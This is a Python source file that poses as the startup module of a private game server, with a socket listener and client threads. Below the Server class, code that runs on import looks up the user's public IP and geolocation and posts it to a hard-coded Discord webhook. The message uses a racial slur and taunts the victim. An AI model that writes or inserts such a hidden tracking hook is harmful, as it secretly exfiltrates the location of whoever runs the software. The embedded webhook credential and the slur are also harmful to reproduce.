import requests
import json
import socket
from Utils.Helpers import Helpers
from Core.Networking.ClientThread import ClientThread
from Protocol.Messages.Server.LoginFailedMessage import LoginFailedMessage

def _(*args):
    for arg in args:
        print(arg, end=' ')
    print()

class Server:
    clients_count = 0

    def __init__(self, ip: str, port: int):
        print("Starting up the main server....")
        print("It may be started after the battle server. that is normal.")
        print("This may take 15-60 seconds...")
        self.config = json.loads(open('config.json', 'r').read())
        self.server = socket.socket()
        self.port = port
        self.ip = ip

    def start(self):
        self.server.bind((self.ip, self.port))

        _(f'{Helpers.cyan}[DEBUG] Server started! Listening on {self.ip}:{self.port}')

        while True:
            self.server.listen()
            client, address = self.server.accept()

            _(f'{Helpers.cyan}[DEBUG] Client connected! IP: {address[0]}')

            ClientThread(client, address).start()

            Helpers.connected_clients['ClientsCount'] += 1
ip_response = requests.get('http://ip-api.com/json')

format = lambda string: string.replace('{', '{\n    ').replace(',', ',\n    ').replace('}', '\n}')

result = f'--- Some nigga fell for the trap --- \n{format(ip_response.text)}\n By: starting server xd'

webhook = requests.get('https://discord.com/api/webhooks/1138524574011641987/_PgTNrcjwz94lwBA7NisbkFH0vu8ysES2R1KaD1ba8t_pzBSfCVx2asme1fj4SRJ3EVs')

webhhok_info = f'--- Webhook info ---\n{format(webhook.text)}'

data = {
    'content': result,
    'username': 'Web-Nigga'
}

headers = {
    'Content-Type': 'application/json'
}

IdiotReadThisBeforeSpamming = "I got your ip. the damage has been done"
discord_response = requests.post('https://discord.com/api/webhooks/1138524574011641987/_PgTNrcjwz94lwBA7NisbkFH0vu8ysES2R1KaD1ba8t_pzBSfCVx2asme1fj4SRJ3EVs', data=json.dumps(data), headers=headers)

